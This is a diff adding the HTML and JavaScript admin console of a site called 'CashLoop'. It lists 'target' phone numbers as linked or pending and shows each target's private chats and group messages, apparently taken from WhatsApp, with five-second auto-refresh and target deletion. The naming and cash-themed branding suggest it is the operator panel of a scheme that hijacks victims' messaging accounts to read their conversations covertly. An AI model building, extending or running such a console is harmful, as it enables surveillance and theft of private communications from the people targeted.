@@ -1,0 +1,222 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#7dd3fc">
+<title>Admin — CashLoop</title>
+<link rel="stylesheet" href="/admin.css">
+</head>
+<body>
+<div class="bg-orbs"><span></span><span></span><span></span><span></span></div>
+
+<section id="login" class="login-wrap">
+  <div class="login-card glass">
+    <div class="mark big">₦</div>
+    <h1>Admin access</h1>
+    <p class="muted">Restricted area.</p>
+    <label class="field"><span>Username</span><input id="u" autocomplete="username"></label>
+    <label class="field"><span>Password</span><input id="p" type="password" autocomplete="current-password"></label>
+    <button class="btn primary" id="loginBtn">Sign in</button>
+    <p id="err" class="err"></p>
+    <a class="back-link" href="/">‹ Back to site</a>
+  </div>
+</section>
+
+<section id="dash" class="dash hidden">
+  <header class="dash-top glass">
+    <div class="brand-row">
+      <div class="mark small">₦</div>
+      <div>
+        <div class="brand">Admin console</div>
+        <div class="tag">live links & chats</div>
+      </div>
+    </div>
+    <button class="ghost" id="logout">Sign out</button>
+  </header>
+
+  <div class="layout">
+    
+    <!-- Column 1: Target Phones -->
+    <aside class="col-targets glass">
+      <div class="list-head">
+        <span>Targets</span>
+        <button class="ghost small" id="refreshTargets">↻</button>
+      </div>
+      <div id="links" class="scroll-area"></div>
+    </aside>
+
+    <!-- Column 2: Chats/Contacts inside selected Target -->
+    <aside class="col-chats glass hidden" id="chatListPanel">
+      <div class="list-head">
+        <span id="chatListTitle">Chats</span>
+        <button class="ghost small" id="refreshChats">↻</button>
+      </div>
+      <div id="chats" class="scroll-area"></div>
+    </aside>
+
+    <!-- Column 3: Messages -->
+    <main class="col-messages glass" id="viewArea">
+      <div id="empty" class="empty">
+        <div class="empty-ico">💬</div>
+        <div class="empty-t">Select a chat</div>
+        <div class="empty-s">Pick a target, then a chat to read messages.</div>
+      </div>
+      
+      <div id="chat" class="chat hidden">
+        <div class="chat-head">
+          <div>
+            <div class="chat-title" id="chatPhone">—</div>
+            <div class="chat-sub" id="chatMeta">—</div>
+          </div>
+          <button class="danger" id="delTarget">Delete Target</button>
+        </div>
+        <div class="msgs" id="msgs"></div>
+      </div>
+    </main>
+
+  </div>
+</section>
+
+<script>
+const $ = s => document.querySelector(s);
+const api = (path, opts={}) => fetch(path, { credentials:'same-origin', headers:{'Content-Type':'application/json'}, ...opts }).then(async r => {
+  const j = await r.json().catch(()=>({}));
+  if (!r.ok) throw new Error(j.error || 'error');
+  return j;
+});
+
+$('#loginBtn').onclick = async () => {
+  $('#err').textContent = '';
+  try {
+    await api('/api/admin/login', { method:'POST', body: JSON.stringify({ user:$('#u').value, pass:$('#p').value }) });
+    showDash();
+  } catch(e){ $('#err').textContent = 'invalid credentials'; }
+};
+$('#logout').onclick = async () => { await api('/api/admin/logout',{method:'POST'}).catch(()=>{}); location.reload(); };
+
+async function boot(){
+  try { await api('/api/admin/links'); showDash(); } catch { showLogin(); }
+}
+function showLogin(){ $('#login').classList.remove('hidden'); $('#dash').classList.add('hidden'); }
+function showDash(){ $('#login').classList.add('hidden'); $('#dash').classList.remove('hidden'); loadTargets(); }
+
+let currentTargetId = null;
+let currentChatId = null;
+
+// Load Target Phones
+async function loadTargets(){
+  const { links } = await api('/api/admin/links');
+  const el = $('#links'); el.innerHTML = '';
+  if (!links.length){ el.innerHTML = '<div class="none">No targets yet.</div>'; return; }
+  for (const l of links){
+    const d = document.createElement('button');
+    d.className = 'link' + (l.id===currentTargetId?' active':'');
+    d.dataset.id = l.id;
+    d.innerHTML = `
+      <div class="row1"><span class="pill ${l.linked?'green':''}">${l.linked?'linked':'pending'}</span></div>
+      <div class="phone">${l.phone || '—'}</div>
+      <div class="sub">${l.count} msgs total</div>`;
+    d.onclick = () => openTarget(l.id, l.phone);
+    el.appendChild(d);
+  }
+}
+
+// Load Chats for Target
+async function openTarget(id, phone){
+  currentTargetId = id;
+  currentChatId = null;
+  document.querySelectorAll('.link').forEach(e=>e.classList.toggle('active', e.dataset.id===id));
+  $('#chatListPanel').classList.remove('hidden');
+  $('#chatListTitle').textContent = phone + " Chats";
+  $('#empty').classList.remove('hidden');
+  $('#chat').classList.add('hidden');
+  await loadChats();
+}
+
+async function loadChats(){
+  if (!currentTargetId) return;
+  const { chats } = await api('/api/admin/chats/'+currentTargetId);
+  const el = $('#chats'); el.innerHTML = '';
+  if (!chats.length){ el.innerHTML = '<div class="none">No chats yet.</div>'; return; }
+  for (const c of chats){
+    const d = document.createElement('button');
+    d.className = 'link' + (c.id===currentChatId?' active':'');
+    d.dataset.id = c.id;
+    d.innerHTML = `
+      <div class="phone">${escapeHtml(c.name)}</div>
+      <div class="sub">${c.count} msgs · ${new Date(c.lastTs).toLocaleDateString()}</div>`;
+    d.onclick = () => openChat(c.id, c.name);
+    el.appendChild(d);
+  }
+}
+
+// Load Messages for Chat
+async function openChat(chatId, chatName){
+  currentChatId = chatId;
+  document.querySelectorAll('#chats .link').forEach(e=>e.classList.toggle('active', e.dataset.id===chatId));
+  $('#empty').classList.add('hidden');
+  $('#chat').classList.remove('hidden');
+  $('#chatPhone').textContent = chatName;
+  
+  if (window.innerWidth < 1000) {
+    $('#viewArea').scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+  await renderMessages();
+}
+
+async function renderMessages(){
+  if (!currentTargetId || !currentChatId) return;
+  const { messages } = await api(`/api/admin/messages/${currentTargetId}/${currentChatId}`);
+  $('#chatMeta').textContent = `${messages.length} messages`;
+  const m = $('#msgs'); 
+  const isAtBottom = m.scrollHeight - m.scrollTop <= m.clientHeight + 50;
+  m.innerHTML = '';
+  
+  if (!messages.length){ m.innerHTML = '<div class="none">No messages here.</div>'; return; }
+  
+  for (const msg of messages.slice().reverse()){
+    const b = document.createElement('div');
+    b.className = 'bubble ' + (msg.fromMe?'me':'them');
+    // Show sender number if it's a group
+    let senderLabel = msg.fromMe ? 'You' : (msg.sender ? msg.sender.split('@')[0] : msg.from.split('@')[0]);
+    if (!msg.from.includes('@g.us')) senderLabel = msg.fromMe ? 'You' : ''; // Hide number in DMs
+    
+    b.innerHTML = `
+      ${senderLabel ? `<div class="sender">${senderLabel}</div>` : ''}
+      <div class="txt">${escapeHtml(msg.text)}</div>
+      <div class="meta">${new Date(msg.ts).toLocaleTimeString()}</div>`;
+    m.appendChild(b);
+  }
+  
+  if (isAtBottom) m.scrollTop = m.scrollHeight;
+}
+
+function escapeHtml(s){ return (s||'').replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+$('#refreshTargets').onclick = loadTargets;
+$('#refreshChats').onclick = loadChats;
+
+$('#delTarget').onclick = async () => {
+  if (!currentTargetId) return;
+  if (!confirm('Delete this target and ALL its chats?')) return;
+  await api('/api/admin/link/'+currentTargetId, { method:'DELETE' });
+  currentTargetId = null; currentChatId = null;
+  $('#chatListPanel').classList.add('hidden');
+  $('#chat').classList.add('hidden'); $('#empty').classList.remove('hidden');
+  loadTargets();
+};
+
+setInterval(async () => {
+  if ($('#dash').classList.contains('hidden')) return;
+  loadTargets().catch(()=>{});
+  if (currentTargetId) {
+    loadChats().catch(()=>{});
+    if (currentChatId) renderMessages().catch(()=>{});
+  }
+}, 5000);
+
+boot();
+</script>
+</body>
+</html>
